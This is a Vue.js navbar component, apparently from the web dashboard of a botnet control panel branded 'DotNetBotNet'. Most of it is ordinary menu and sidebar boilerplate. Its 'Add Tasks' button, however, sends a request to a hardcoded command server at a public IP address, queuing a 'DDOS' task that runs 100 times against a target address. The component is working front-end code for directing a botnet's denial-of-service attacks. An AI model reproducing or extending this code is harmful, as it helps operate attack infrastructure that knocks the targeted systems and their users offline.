<template>
  <nav class="navbar navbar-expand-lg navbar-absolute sticky-top"
       :class="{'bg-black': !showMenu, 'navbar-transparent': showMenu}">
    <div class="container-fluid" style="border-bottom: 1px solid white;">
      <div class="container-fluid" >
        <div class="navbar-wrapper">
          <a class="navbar-brand" style="width: 50%; margin: auto 41% ; font-size: 36px; font-weight:bold;" href="">DotNetBotNet</a>
          <div class="col-form-label-sm">
            <button class="badge-pill btn-info" @click="addMoreTasks">Add Tasks</button>
          </div>
        </div>
      </div>
      <button class="navbar-toggler" type="button"
              @click="toggleMenu"
              data-toggle="collapse"
              data-target="#navigation"
              aria-controls="navigation-index"
              aria-label="Toggle navigation">
      </button>

      <collapse-transition>
        <div class="collapse navbar-collapse show" v-show="showMenu">
          <ul class="navbar-nav" :class="$rtl.isRTL ? 'mr-auto' : 'ml-auto'">
            <div class="search-bar input-group" @click="searchModalVisible = true">

            </div>
          </ul>
        </div>
      </collapse-transition>
    </div>
  </nav>
</template>
<script>
  import { CollapseTransition } from 'vue2-transitions';
  import Modal from '@/components/Modal';
  import axios from "axios";
  import WorkerAdapter from "@/pages/store/adapter/WorkerAdapter";

  export default {
    components: {
      CollapseTransition,
      Modal
    },
    computed: {
      routeName() {
        const { name } = this.$route;
        return this.capitalizeFirstLetter(name);
      },
      isRTL() {
        return this.$rtl.isRTL;
      }
    },
    data() {
      return {
        activeNotifications: false,
        showMenu: false,
        searchModalVisible: false,
        searchQuery: ''
      };
    },
    methods: {
      capitalizeFirstLetter(string) {
        return string.charAt(0).toUpperCase() + string.slice(1);
      },
      toggleNotificationDropDown() {
        this.activeNotifications = !this.activeNotifications;
      },
      closeDropDown() {
        this.activeNotifications = false;
      },
      toggleSidebar() {
        this.$sidebar.displaySidebar(!this.$sidebar.showSidebar);
      },
      hideSidebar() {
        this.$sidebar.displaySidebar(false);
      },
      toggleMenu() {
        this.showMenu = !this.showMenu;
      },
      addMoreTasks() {
        axios.post(`http://45.55.70.104:8080/Management/QueueTask`, {
          Task: "DDOS",
          Count: 100,
          TaskParameters: {
            Interval: 15,
            Address: "10.64.128.112"
          }
        })
          .then((res) => {
            this.worker = new WorkerAdapter(res.data.bot);
            // state.commit(StoreMutations.SET_ALL_COMPLETED_TASKS, res.data);
          })
          .catch((error) => {
            // eslint-disable-next-line
            console.error(error);
          });
      }
    }
  };
</script>
<style>
</style>
